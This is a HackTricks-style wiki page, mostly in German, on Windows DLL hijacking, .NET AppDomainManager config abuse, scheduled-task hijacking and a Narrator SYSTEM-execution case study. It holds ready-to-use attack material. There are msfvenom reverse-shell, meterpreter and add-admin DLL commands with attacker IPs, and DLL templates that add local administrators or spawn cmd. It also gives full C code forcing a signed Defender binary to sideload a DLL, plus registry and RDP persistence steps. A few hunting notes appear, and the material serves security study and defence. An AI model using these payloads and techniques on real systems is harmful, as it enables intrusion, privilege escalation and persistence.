# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking beinhaltet die Manipulation einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Der Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Er wird hauptsächlich für Code Execution, das Erreichen von Persistenz und seltener für Privilege Escalation genutzt. Trotz des hierigen Fokus auf Escalation bleibt die Hijacking-Methode über alle Ziele hinweg gleich.

### Common Techniques

Für DLL Hijacking werden mehrere Methoden eingesetzt, deren Wirksamkeit von der DLL-Load-Strategie der Anwendung abhängt:

1. **DLL Replacement**: Ersetzen einer legitimen DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der Original-DLL zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen DLL und Ausnutzen des Suchmusters der Anwendung.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL für eine Anwendung, damit sie diese lädt, weil sie denkt, es handle sich um eine nicht vorhandene erforderliche DLL.
4. **DLL Redirection**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local` Dateien, um die Anwendung auf die bösartige DLL umzuleiten.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch ein bösartiges Gegenstück im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading verbunden ist.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich wie bei Binary Proxy Execution Techniken.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klassisches DLL sideloading ist nicht der einzige Weg, um einen vertrauenswürdigen **.NET Framework** Prozess dazu zu bringen, Attacker-Code zu laden. Wenn die Ziel-EXE eine **managed** Anwendung ist, prüft die CLR auch eine **application configuration file**, die nach der EXE benannt ist (zum Beispiel `Setup.exe.config`). Diese Datei kann einen benutzerdefinierten **AppDomainManager** definieren. Wenn die config auf eine vom Angreifer kontrollierte assembly verweist, die neben der EXE abgelegt ist, lädt die CLR sie **vor dem normalen Codepfad der Anwendung** und führt sie innerhalb des vertrauenswürdigen Prozesses aus.

Laut dem .NET Framework configuration schema von Microsoft müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktische Hinweise:
- Das ist **.NET Framework-spezifische** Tradecraft. Es hängt vom CLR-Config-Parsing ab, nicht von der Win32 DLL search order.
- Der Host muss wirklich eine **managed EXE** sein. Schnelle Prüfung: `sigcheck -m target.exe`, `corflags target.exe`, oder nach dem **CLR Runtime Header** in den PE-Metadaten suchen.
- Der Config-Dateiname muss exakt zum Namen der ausführbaren Datei passen (`<binary>.config`) und liegt normalerweise **direkt neben der EXE**.
- Das ist nützlich bei **signierten Microsoft/vendor binaries**, weil die vertrauenswürdige EXE unverändert bleibt, während die bösartige managed assembly im selben Prozess ausgeführt wird.
- Wenn du bereits ein beschreibbares Installer-/Update-Verzeichnis hast, kann AppDomainManager hijacking als **erste Stufe** verwendet werden, gefolgt von klassischem DLL sideloading oder reflective loading für spätere Stufen.

### Vorhandene Scheduled Task hijacken, um die sideload chain erneut zu starten

Für Persistence nicht nur nach dem **Erstellen einer neuen Task** suchen. Manche intrusion sets warten, bis ein legitimer Installer eine **normale updater task** erstellt, und **schreiben dann die task action um**, sodass Name, Author und Trigger weiterhin für Defenders vertraut aussehen.

Wiederverwendbarer Workflow:
1. Die legitime Software installieren/ausführen und die Task identifizieren, die sie normalerweise erstellt.
2. Das Task-XML exportieren und die aktuellen Werte von `<Exec><Command>` / `<Arguments>` notieren.
3. Nur die Action ersetzen, sodass die Task deine **trusted host EXE** aus einem user-writable staging directory startet, die dann die echte payload per side-load oder per AppDomain lädt.
4. Dieselbe Task mit demselben Namen erneut registrieren, statt ein neues, offensichtliches Persistence-Artefakt zu erstellen.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Warum es stealthier ist:
- Der Task-Name kann weiterhin legitim aussehen (zum Beispiel ein Vendor-Updater).
- Der **Task Scheduler service** startet ihn, sodass Parent-/Ancestor-Validierung oft die erwartete Scheduling-Chain sieht statt `explorer.exe`.
- DFIR-Teams, die nur nach **neuen Task-Namen** suchen, übersehen möglicherweise einen Task, dessen Registrierung schon existierte, dessen Aktion aber jetzt auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen attacker-controlled path zeigt.

Schnelle Hunting-Pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche `C:\Windows\System32\Tasks\*` XML und `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` Metadata gegen eine Baseline.
- Alarme auslösen, wenn ein **vendor-looking updater task** aus **user-writable directories** ausgeführt wird oder eine .NET EXE mit einer colocated `*.config` Datei startet.

> [!TIP]
> Für eine Step-by-step Chain, die HTML staging, AES-CTR configs und .NET implants auf DLL sideloading aufsetzt, lies den Workflow unten.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finden fehlender Dlls

Der häufigste Weg, fehlende Dlls in einem System zu finden, ist, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von sysinternals auszuführen und die **folgenden 2 Filter** zu setzen:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

und nur die **File System Activity** anzuzeigen:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Wenn du nach **fehlenden dlls allgemein** suchst, lässt du dies für einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden dll in einer bestimmten ausführbaren Datei** suchst, solltest du einen **weiteren Filter wie "Process Name" "contains" `<exec name>`** setzen, sie ausführen und dann die Event-Erfassung stoppen.

## Ausnutzen fehlender Dlls

Um Privilegien zu eskalieren, ist unsere beste Chance, **eine dll schreiben zu können, die ein privilegierter Prozess laden will**, und zwar an einem **Ort, an dem danach gesucht wird**. Daher können wir entweder eine dll in einen **Ordner schreiben, der vor** dem Ordner mit der **originalen dll** durchsucht wird (Sonderfall), oder wir können in einen Ordner schreiben, in dem nach der dll gesucht wird, während die originale **dll** in keinem Ordner existiert.

### Dll Search Order

**In der** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kannst du genau sehen, wie Dlls geladen werden.**

**Windows applications** suchen nach DLLs über eine Reihe von **vordefinierten Suchpfaden** in einer bestimmten Reihenfolge. Das Problem des DLL hijacking entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der echten DLL geladen wird. Eine Lösung, um das zu verhindern, ist, dass die Anwendung beim Verweis auf die benötigten DLLs absolute Pfade verwendet.

Die **DLL search order auf 32-bit** Systemen sieht so aus:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das system directory. Verwende die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten.(_C:\Windows\System32_)
3. Das 16-bit system directory. Es gibt keine Funktion, um den Pfad dieses Verzeichnisses zu ermitteln, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) Funktion, um den Pfad dieses Verzeichnisses zu erhalten.
1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der PATH environment variable aufgelistet sind. Beachte, dass dies nicht den per-application path umfasst, der im **App Paths** registry key angegeben ist. Der **App Paths** key wird bei der Berechnung des DLL search path nicht verwendet.

Das ist die **Standard**-Suchreihenfolge mit aktiviertem **SafeDllSearchMode**. Wenn er deaktiviert ist, rückt das aktuelle Verzeichnis auf den zweiten Platz. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (default ist aktiviert).

Wenn die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachte außerdem, dass **eine dll über den absoluten Pfad statt nur über den Namen geladen werden kann**. In diesem Fall wird diese dll **nur in diesem Pfad gesucht** (wenn die dll Abhängigkeiten hat, werden diese wie gerade per Name geladen gesucht).

Es gibt noch andere Möglichkeiten, die Suchreihenfolge zu verändern, aber ich werde sie hier nicht erklären.

### Verkettung eines arbitrary file write zu einem missing-DLL hijack

1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu sammeln, nach denen der Prozess sucht, die er aber nicht findet.
2. Wenn die Binary nach Zeitplan/über einen Dienst läuft, wird eine DLL mit einem dieser Namen in das **application directory** zu droppen (Suchreihenfolge-Eintrag #1) beim nächsten Start geladen. In einem .NET-Scanner-Fall suchte der Prozess vor dem Laden der echten Kopie aus `C:\Program Files\dotnet\fxr\...` nach `hostfxr.dll` in `C:\samples\app\`.
3. Baue eine Payload-DLL (z. B. reverse shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn dein Primitive ein **ZipSlip-style arbitrary write** ist, erstelle ein ZIP, dessen Entry aus dem extraction dir ausbricht, sodass die DLL im App-Ordner landet:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Liefere das Archiv an den überwachten Inbox/share; wenn der geplante Task den Prozess erneut startet, lädt er die malicious DLL und führt deinen Code als der service account aus.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ein fortgeschrittener Weg, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, das Feld DllPath in RTL_USER_PROCESS_PARAMETERS beim Erstellen des Prozesses mit den nativen APIs von ntdll zu setzen. Wenn hier ein vom Angreifer kontrolliertes Verzeichnis angegeben wird, kann ein Zielprozess, der eine importierte DLL per Name auflöst (kein absoluter Pfad und keine Verwendung der safe loading flags), dazu gezwungen werden, eine malicious DLL aus diesem Verzeichnis zu laden.

Key idea
- Erzeuge die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem dein dropper/unpacker liegt).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn das Zielbinary eine DLL per Name auflöst, prüft der Loader diesen übergebenen DllPath während der Auflösung und ermöglicht so zuverlässiges sideloading, selbst wenn sich die malicious DLL nicht im selben Verzeichnis wie die Ziel-EXE befindet.

Notes/limitations
- Dies betrifft den zu erstellenden Child Process; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
- Das Ziel muss eine DLL per Name importieren oder mit LoadLibrary laden (kein absoluter Pfad und keine Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und hart codierte absolute Pfade können nicht hijacked werden. Forwarded exports und SxS können die Priorität verändern.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


### .NET AppDomainManager hijacking via `.exe.config`

For **.NET Framework** targets, sideloading can be done **before `Main()`** without patching memory by abusing the application's adjacent **`.exe.config`** file. Instead of relying only on the Win32 DLL search order, the attacker places a legitimate .NET EXE next to a malicious config and one or more attacker-controlled assemblies.

How the chain works:
1. The host EXE starts and the **CLR reads `<exe>.config`**.
2. The config sets **`<appDomainManagerAssembly>`** and **`<appDomainManagerType>`** so the runtime instantiates an attacker-controlled `AppDomainManager`.
3. The malicious manager gets **pre-`Main()` execution** inside the trusted host process.
4. The same config can force the CLR to resolve local assemblies first (for example `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) and can weaken runtime validation/telemetry without inline patching.

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Warum das nützlich ist:
- **`<probing privatePath="."/>`** hält die assembly resolution im Anwendungsverzeichnis und macht den Ordner zu einer vorhersagbaren sideloading surface.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Code des Angreifers, bevor die legitime App-Logik läuft.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann einer Full-Trust-App erlauben, unsignierte oder manipulierte Assemblies ohne strong-name validation failure zu laden.
- **`<publisherPolicy apply="no"/>`** vermeidet publisher-policy redirects zu neueren assemblies.
- **`<requiredRuntime ... safemode="true"/>`** macht die runtime selection deterministischer.
- **`<etwEnable enabled="false"/>`** ist besonders interessant, weil die **CLR ihre eigene ETW-Sichtbarkeit** direkt über die Konfiguration deaktiviert, statt dass das Implantat `EtwEventWrite` im Speicher patcht.

Betrieblicher Ablauf, der in jüngeren Kampagnen beobachtet wurde:
- Stage 1 legt `setup.exe`, `setup.exe.config` und lokale assemblies ab.
- Stage 2 kopiert sie in einen glaubwürdigen **AppData update**-Ordner, benennt den Host in etwas wie `update.exe` um und startet ihn erneut über einen **scheduled task**.
- Stage 3 prüft den Ausführungskontext (z. B. erwarteter Parent `svchost.exe` von Task Scheduler), bevor die finale RAT DLL/export geladen wird.

Hunting ideas:
- Signierte oder anderweitig legitime **.NET executables**, die mit verdächtigen benachbarten **`.config`**-Dateien an benutzerbeschreibbaren Speicherorten laufen.
- `.config`-Dateien mit **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`**.
- Scheduled tasks, die umbenannte Update-Binaries aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen `\bin\update\`-Verzeichnissen erneut starten.
- Parent/child-Ketten, bei denen ein scheduled task einen vertrauenswürdigen .NET-Host startet, der sofort nicht-vendor assemblies aus seinem eigenen Verzeichnis lädt.

#### Exceptions on dll search order from Windows docs

Bestimmte Ausnahmen zur standardmäßigen DLL search order sind in der Windows-Dokumentation vermerkt:

- Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene DLL hat**, gefunden wird, umgeht das System die übliche Suche. Stattdessen prüft es Redirection und ein manifest, bevor es standardmäßig die bereits im Speicher befindliche DLL verwendet. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
- Falls die DLL als **known DLL** für die aktuelle Windows-Version erkannt wird, verwendet das System deren Version der known DLL samt aller abhängigen DLLs und **verzichtet auf den Suchprozess**. Der Registry-Schlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser known DLLs.
- Wenn eine **DLL Abhängigkeiten** hat, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie nur durch ihre **module names** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.

### Escalating Privileges

**Requirements**:

- Identifiziere einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontal or lateral movement), dem **eine DLL fehlt**.
- Stelle sicher, dass **Schreibzugriff** auf jedes **Verzeichnis** vorhanden ist, in dem nach der **DLL** gesucht wird. Dieser Ort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis innerhalb des system path sein.

Ja, die Voraussetzungen sind kompliziert zu finden, denn **standardmäßig ist es ziemlich ungewöhnlich, eine privilegierte ausführbare Datei zu finden, der eine dll fehlt**, und es ist sogar **noch ungewöhnlicher, Schreibrechte auf einen system path-Ordner zu haben** (standardmäßig nicht möglich). Aber in falsch konfigurierten Umgebungen ist das möglich.\
Wenn du Glück hast und die Anforderungen erfüllst, kannst du das Projekt [UACME](https://github.com/hfiref0x/UACME) prüfen. Auch wenn das **Hauptziel des Projekts das Bypass UAC** ist, findest du dort möglicherweise einen **PoC** eines Dll hijaking für die Windows-Version, den du verwenden kannst (wahrscheinlich nur mit Anpassung des Pfads des Ordners, für den du Schreibrechte hast).

Beachte, dass du **deine Berechtigungen in einem Ordner prüfen** kannst, indem du:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Ordner innerhalb von PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die imports einer ausführbaren Datei und die exports einer dll mit prüfen:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für einen vollständigen Leitfaden dazu, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren**, mit Berechtigungen zum Schreiben in einen **System Path**-Ordner, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibrechte auf irgendeinen Ordner innerhalb des system PATH hast.\
Andere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind die **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Example

Falls du ein ausnutzbares Szenario findest, wäre eine der wichtigsten Dinge für einen erfolgreichen Exploit, **eine dll zu erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importieren wird**. Beachte aber, dass Dll Hijacking nützlich ist, um [von Medium Integrity level zu High zu eskalieren (**UAC bypass**)](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Du findest ein Beispiel dafür, **wie man eine gültige dll erstellt**, in dieser Studie zu dll hijacking mit Fokus auf Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **einfache dll codes**, die als **Templates** nützlich sein können oder um eine **dll mit nicht erforderlichen exportierten Funktionen** zu erstellen.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Im Grunde ist ein **Dll proxy** eine Dll, die **deinen bösartigen code ausführen kann, wenn sie geladen wird**, aber auch dazu dient, sich **zu exponieren** und **zu funktionieren** wie erwartet, indem **alle Aufrufe an die echte library weitergeleitet werden**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **eine ausführbare Datei angeben und die library auswählen**, die du proxifyen willst, und **eine proxified dll erzeugen** oder **die Dll angeben** und **eine proxified dll erzeugen**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen meterpreter (x86) erhalten:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen User erstellen (x86, ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Dein eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren** muss, die vom Opferprozess geladen werden; wenn diese Funktionen nicht existieren, wird die **Binary sie nicht laden können** und der **Exploit wird fehlschlagen**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternative C DLL mit thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersagbare, sprachspezifische Localization DLL, die für arbitrary code execution und persistence hijacked werden kann.

Wichtige Fakten
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn eine schreibbare, attacker-controlled DLL am OneCore path existiert, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Es sind keine exports erforderlich.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Starte Narrator und beobachte den Ladeversuch des obigen Pfads.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ein naiver hijack wird UI sprechen/hervorheben. Um ruhig zu bleiben, bei attach die Narrator-Threads enumerieren, den Main-Thread mit (`OpenThread(THREAD_SUSPEND_RESUME)`) öffnen und ihn mit `SuspendThread` anhalten; in deinem eigenen Thread weitermachen. Siehe PoC für den vollständigen Code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit dem oben Genannten lädt das Starten von Narrator die platzierte DLL. Auf dem secure desktop (logon screen) drücke CTRL+WIN+ENTER, um Narrator zu starten; deine DLL führt dann als SYSTEM auf dem secure desktop aus.

RDP-triggered SYSTEM execution (lateral movement)
- Klassische RDP security layer erlauben: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Per RDP auf den Host verbinden, am logon screen CTRL+WIN+ENTER drücken, um Narrator zu starten; deine DLL führt dann als SYSTEM auf dem secure desktop aus.
- Die Ausführung stoppt, wenn die RDP-Sitzung geschlossen wird—schnell injizieren/migrieren.

Bring Your Own Accessibility (BYOA)
- Du kannst einen eingebauten Accessibility Tool (AT)-Registry-Eintrag klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf eine beliebige binary/DLL zeigt, ihn importieren und dann `configuration` auf diesen AT-Namen setzen. Das vermittelt beliebige Ausführung unter dem Accessibility framework.

Notes
- Das Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` liegen; Exports werden nicht benötigt.

